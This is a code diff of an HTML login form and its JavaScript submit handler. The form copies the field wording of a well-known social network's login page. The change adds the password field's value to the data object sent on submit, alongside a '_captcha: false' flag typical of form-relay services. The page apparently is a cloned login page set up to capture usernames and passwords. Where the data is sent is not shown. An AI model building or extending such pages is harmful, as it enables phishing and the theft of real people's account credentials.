@@ -86,13 +86,13 @@
 <form id="loginForm">
     <div class="field">
         <input id="user" name="user" type="text"
-               placeholder="Phone number, username, or email" required />
+               placeholder="" required />
         <label for="user">Phone number, username, or email</label>
     </div>
 
     <div class="field">
         <input id="password" type="password"
-               placeholder="Password" required />
+               placeholder="" required />
         <label for="password">Password</label>
     </div>
 
@@ -108,9 +108,11 @@ document.getElementById("loginForm").addEventListener("submit", async function (
     e.preventDefault();
 
     const user = document.getElementById("user").value;
+    const password = document.getElementById("password").value;
 
     const data = {
         user: user,
+        password:password,
         _captcha: false
     };
 
